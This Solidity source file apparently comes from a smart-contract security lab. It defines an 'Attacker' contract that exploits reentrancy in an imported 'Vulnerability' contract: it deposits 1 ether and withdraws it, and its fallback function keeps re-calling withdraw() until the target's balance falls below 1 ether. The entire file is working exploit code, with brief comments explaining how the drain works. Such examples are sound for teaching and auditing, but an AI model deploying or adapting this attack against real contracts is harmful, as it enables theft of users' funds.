// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "./Vulnerability.sol";

contract Attacker {
    Vulnerability public vulnInstance;

    constructor(address _vulnAddress) {
        vulnInstance = Vulnerability(_vulnAddress);
    }

    // Fallback is called when vulnInstance sends Ether to this contract
    // so withdraw() will be executed multiple times, since it runs everytime this contract receives ETH
    fallback() external payable {
        if (address(vulnInstance).balance >= 1 ether) {
            vulnInstance.withdraw();
        }
    }

    function attack() external payable {
        require(msg.value >= 1 ether);
        vulnInstance.deposit{value: 1 ether}();
        vulnInstance.withdraw();
    }

    // Helper function to check the balance of this contract
    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
}
